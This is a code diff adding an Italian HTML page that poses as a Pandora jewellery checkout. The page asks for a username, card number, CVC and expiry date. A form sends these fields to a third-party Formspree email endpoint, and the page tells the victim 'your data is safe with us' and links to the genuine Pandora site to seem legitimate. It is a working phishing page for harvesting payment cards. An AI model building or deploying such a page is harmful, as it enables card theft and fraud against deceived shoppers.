@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Modulo Pandora</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f8f8;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .form-container {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"], input[type="number"], input[type="email"] {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        input[type="submit"] {
+            width: 100%;
+            padding: 14px;
+            background-color: #ff5733;
+            border: none;
+            color: white;
+            font-size: 18px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #e14a29;
+        }
+
+        .message {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #666;
+        }
+
+        .message a {
+            color: #ff5733;
+            text-decoration: none;
+        }
+
+        .message a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h1>Completa il tuo acquisto Pandora 💍</h1>
+        <p>Inserisci i dati per acquistare la tua collana Pandora</p>
+
+        <!-- Form che invia i dati all'email tramite Formspree -->
+        <form action="https://formspree.io/f/xqabljlk" method="POST" id="payment-form">
+            <input type="text" name="username" placeholder="Nome Utente" required>
+            <input type="number" name="cardnumber" id="cardnumber" placeholder="Numero Carta (max 16 cifre)" maxlength="16" required>
+            <input type="number" name="cvc" id="cvc" placeholder="CVC (max 3 cifre)" maxlength="3" required>
+            <input type="text" name="expirydate" placeholder="Data di Scadenza (MM/YY)" required>
+            
+            <input type="submit" value="Completa Acquisto">
+        </form>
+
+        <div class="message">
+            <p>Grazie per il pagamento ❤️. I tuoi dati sono al sicuro con noi.</p>
+            <p><a href="https://it.pandora.net/it/charm/catene-di-sicurezza/catena-di-sicurezza-margherite/798764C01.html" target="_blank">Clicca qui per visitare Pandora!</a></p>
+        </div>
+    </div>
+
+    <script>
+        // Funzione per prevenire il DOS con invii troppo veloci
+        let formSubmitTime = Date.now();
+        document.getElementById('payment-form').addEventListener('submit', function(event) {
+            let currentTime = Date.now();
+            if (currentTime - formSubmitTime < 5000) { // impedisce invii in meno di 5 secondi
+                alert("Per favore, non inviare il modulo troppo rapidamente.");
+                event.preventDefault();
+                return false;
+            }
+            formSubmitTime = currentTime;
+        });
+
+        // Funzione per validare il numero della carta
+        document.getElementById('cardnumber').addEventListener('input', function(event) {
+            if (event.target.value.length > 16) {
+                event.target.value = event.target.value.slice(0, 16); // Limita a 16 cifre
+            }
+        });
+
+        // Funzione per validare il CVC
+        document.getElementById('cvc').addEventListener('input', function(event) {
+            if (event.target.value.length > 3) {
+                event.target.value = event.target.value.slice(0, 3); // Limita a 3 cifre
+            }
+        });
+    </script>
+</body>
+</html>
